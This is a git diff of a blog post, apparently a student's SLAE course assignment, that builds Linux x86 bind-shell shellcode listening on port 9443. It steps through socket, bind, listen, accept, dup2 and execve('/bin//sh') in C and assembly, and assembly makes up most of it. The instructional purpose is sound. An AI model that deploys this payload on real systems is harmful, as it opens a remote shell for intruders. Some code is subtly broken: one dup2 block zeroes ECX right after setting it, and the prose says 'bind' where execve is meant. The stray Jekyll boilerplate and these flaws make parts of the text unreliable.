@@ -11,7 +11,7 @@ Student ID: SLAE-1203 </blockquote>
 
 The First assignement was about developing a shellcode that listens for a connection on a Local Port (9443 in this case) and spawn a command shell whenever someone connects to it. The idea is to be able to run arbitrary commands on the target system, after successfull exploitation of course :D. Also in this assignement i will try to come with something custom :
 
-1. The use of `socket` syscall instead of the classic `socketcall` syscall
+1. The use of `socket`, `bind`, `listen`, `accept` syscalls instead of the classic `socketcall` syscall
 2. We will create something that does not die after the first successfull connection, and able to accept multiple conections ! (Fork, Fork, Fork :D)
 
 Before we start i highly recommend to make sure you understand the difference between a **TCP bind shell** and a **TCP reverse shell**. Here is some reference you can start with : [Bind Vs Reverse TCP Shell]
@@ -59,7 +59,7 @@ sockfd = socket(AF_INET, SOCK_STREAM, 0);
 {% endhighlight %}
 
 Let's get our hand dirty and implement this line of C code with assembly :
-{% highlight assembly %}
+{% highlight nasm %}
 ; Bind Shell Port 9443
 
 global _start
@@ -85,9 +85,184 @@ Here is a quick recap of what we have done so far, first we set all registers (E
 Once done we can set arguments in the order we saw earlier, EDX should be 0x00, EBX sould be 0x02, ECX should be 0x01 and of course EAX should be set to 0x167 which is the reference of Socket() syscall.
 The `int 0x80` instruction will call the kernel and the function will execute. After execution we will have the register EAX pointing on the socket object we just created.
 
-Now that we have a socket object, we want to bind it to a pecific port on the target machine. As mentionned in the diagram above we will use Bind(). 
+Now that we have a socket object, we want to bind it to a specific port (*9443*) on the target machine. As mentionned in the diagram above we will use Bind().
+From the doc we can see that bind takes the following parameters :
+{% highlight C %}
+int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+{% endhighlight %}
+
+in typical C code we can use the following :
+{% highlight C %}
+struct sockaddr_in my_addr;
+// set struct values
+my_addr.sin_family = AF_INET; // 2
+my_addr.sin_port = htons(port); // port number
+my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP
+
+bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
+{% endhighlight %}
+
+Where sockfd is the file descriptor for the socket we just created with the last Socket() call (Stored in EAX at this point). With assembly, it's a little different since we are making registers pointing directly to the parameters we want to use :
+
+{% highlight nasm %}
+; Bind Shell Port 9443
+
+global _start
+
+section .text
+
+_start:
+      xor eax, eax
+      xor ebx, ebx
+      xor ecx, ecx
+      xor edx, edx, ; set dl to 0 to set Protocol IPPROTO_IP
+      mov ax, 0x167 ; Syscall for socket() is 0x167
+      mov bl, 0x02 ; domain AF_INET 2
+      mov cl, 0x01 ; type SOCK_STREAM 1
+      int 0x80
+
+      mov ebx, eax ; store Socket() descriptor int into ebx
+      mov ax, 0x169; syscall for bind() is 0x169
+      push edx ; prepare sin_addr
+      push word 0xe324 ; prepare port number sin_port , please note that port number must be converted using socket.htons(PORT)
+      push word 0x2 ; prepare sin_family
+      mov ecx, esp ; pass the struct parameter
+      mov dl, 0x10 ; pass the lenght of the structure
+      int 0x80
+{% endhighlight %}
+
+Perfect we have now a socket binded to port 9443 ! Now all we need to do is make this socket listening for connections and accept them :D
+
+In C code we can do that by using the following lines :
+
+```c
+// syscall listen (__NR_listen 363)
+listen(sockfd, 0);
+
+// syscall accept (__NR_accept4 364)
+resultfd = accept(sockfd, NULL, NULL);
+```
+Which in assembly will be something like :
+
+```nasm
+mov ax, 0x16b; syscall for listen() is 0x16b
+; the ebx already points to socketfd
+xor ecx, ecx
+int 0x80
+
+mov dl, al
+mov ax, 0x16c; syscall for accept() is 0x16c
+int 0x80
+```
+At this stage our assembly code should be able open a listening socket binded to local port 9443, let's test it before going further. Our code in assembly so far :
+```nasm
+; Bind Shell Port 9443
+
+global _start
+
+section .text
+
+_start:
+      xor eax, eax
+      xor ebx, ebx
+      xor ecx, ecx
+      xor edx, edx, ; set dl to 0 to set Protocol IPPROTO_IP
+      mov ax, 0x167 ; Syscall for socket() is 0x167
+      mov bl, 0x02 ; domain AF_INET 2
+      mov cl, 0x01 ; type SOCK_STREAM 1
+      int 0x80
+
+      mov ebx, eax ; store Socket() descriptor int into ebx
+      mov ax, 0x169; syscall for bind() is 0x169
+      push edx ; prepare sin_addr
+      push word 0xe324 ; prepare port number sin_port , please note that port number must be converted using socket.htons(PORT)
+      push word 0x2 ; prepare sin_family
+      mov ecx, esp ; pass the struct parameter
+      mov dl, 0x10 ; pass the lenght of the structure
+      int 0x80
+      mov ax, 0x16b; syscall for listen() is 0x16b
+      ; the ebx already points to socketfd
+      xor ecx, ecx
+      int 0x80
+
+      mov dl, al
+      mov ax, 0x16c; syscall for accept() is 0x16c
+      int 0x80
+```
+Let's compile the code and see if it works as expected.
+
+![Compile#1](SLA32_2.png)
+
+Using nasm and a dynamic linker we have a working elf32. After running it we can check if we have something listening on 9443 :
+
+![Listening#1](SLA32_3.png)
+
+And it works, at least for now, because as soon as we try to connect to it the connection will immediatly die. This is normal because we are not finish, we still have to execute `bind` to get our shell !
+
+Now before executing `bind` we need to understand the utility of dup2(). Well, Each process by default has at least three descriptors :
+
+![Compile#1](SLA32_4.png)
+
+The idea is to redirect all the inputs and outputs of the process (/bin/sh in our case) to rhe socket so it can receive inputs from a remote connection and send the results as well :
+
+![Compile#1](SLA32_5.png)
+
+After all of `STDIN`, `STDOUT`, `STDERR` are now sent and received via the socket we can invoke our shell using execve. The following assembly code will do the job for now, we will see how we can improve it right after.
+
+```nasm
+      mov ebx, eax ; save the Accept descriptor in ebx for dup2
+      xor eax, eax
+      mov al, 0x3f
+      int 0x80 ; first dup 2 to redirect STDIN
+      mov al, 0x3f
+      mov cl, 0x1
+      xor ecx, ecx
+      ; second dup2 to redirect STDOUT
+      int 0x80
+      mov al, 0x3f
+      mov cl, 0x2
+      int 0x80 ; third dup2 to redirect STDERR
+      xor ecx, ecx
 
 
+      xor eax,eax
+      push eax
+      mov edx, esp
+      push 0x68732f2f
+      push 0x6e69622f
+      mov ebx,esp
+      push eax
+      push ebx
+      mov ecx,esp
+      mov al,0xb
+      int 0x80
+```
+Something we can notice here is that the firt section of the code, where we are redirecting the I/O, is a bit repetitive, and maybe we can make our code smaller by using a loop instead of setting descriptors one by one. The code can be :
+
+```nasm
+mov ebx, eax ; save the Accept descriptor in ebx for dup2
+      xor eax, eax
+      mov cl, 0x2
+
+loop_dup:
+      mov al, 0x3f
+      int 0x80
+      dec cl
+      jns loop_dup
+
+      xor eax,eax ; here we start the classic execve("/bin//sh")
+      push eax
+      mov edx, esp
+      push 0x68732f2f
+      push 0x6e69622f
+      mov ebx,esp
+      push eax
+      push ebx
+      mov ecx,esp
+      mov al,0xb
+      int 0x80
+
+```
 
 Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
 
